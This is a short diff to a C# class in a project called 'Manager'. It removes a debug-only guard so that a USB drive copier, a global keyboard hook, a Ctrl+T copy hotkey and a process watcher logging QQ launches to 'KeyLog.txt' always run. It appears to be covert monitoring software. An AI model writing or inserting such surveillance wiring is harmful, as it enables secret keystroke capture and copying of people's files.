@@ -15,7 +15,6 @@ namespace Manager
     {
         public BackGround(Window window)
         {
-#if !DEBUG
             App.copyer = new UsbCopyer(st.Default.UsbBackupPath, false, false);
 
             App.hook = new KeyboardHook(true);
@@ -24,11 +23,10 @@ namespace Manager
             App.hotKey = new HotKey(ModifierKeys.Control, Keys.T, window);
             App.hotKey.HotKeyPressed += (hotkey) => { App.copyer.CopyUSB(); };
 
-            ProcessWatcher processWatcher = new ProcessWatcher();
-            processWatcher.AppLaunch += (s, e) => { System.IO.File.AppendAllText("KeyLog.txt", $"APPNAME=QQ,TIME={DateTime.Now}\r\n"); };
+            App.processWatcher.AppLaunch += (s, e) => { System.IO.File.AppendAllText("KeyLog.txt", $"APPNAME=QQ,TIME={DateTime.Now}\r\n"); };
 
             LoadDirBinding();
-#endif
+
             //SyncDirBinding binding = new SyncDirBinding("D:/temp/source","D:/temp/dest");
         }
         private void LoadDirBinding()
